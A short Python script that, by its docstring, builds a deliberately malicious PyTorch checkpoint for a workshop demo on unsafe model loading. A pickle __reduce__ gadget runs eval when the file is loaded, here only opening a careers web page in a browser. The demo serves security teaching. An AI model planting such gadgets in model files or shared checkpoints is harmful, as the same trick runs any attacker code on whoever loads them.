#!/usr/bin/env python3
"""
Rebuild pytorch_model.bin for the workshop demo. Run once before committing:

    uv run python workshop_unsafe_pickled_model/build_checkpoint.py

The artifact is written with torch.save (valid PyTorch checkpoint format), but the
payload is still a pickle gadget. Loading it with weights_only=False runs arbitrary
code during torch.load (here: open the careers page in a browser).
"""

from __future__ import annotations

from pathlib import Path

import torch

VACANCIES_URL = "https://digital.alfabank.ru/vacancies"


class _PickleRcePayload:
    """Portable payload: no dependency on victim imports beyond builtins."""

    def __reduce__(self):
        return (eval, (f'__import__("webbrowser").open("{VACANCIES_URL}")',))


def main() -> None:
    out = Path(__file__).resolve().parent / "pytorch_model.bin"
    # torch.save still uses pickle under the hood, which is the point of this demo.
    torch.save(_PickleRcePayload(), out)
    print(f"Wrote {out}")


if __name__ == "__main__":
    main()
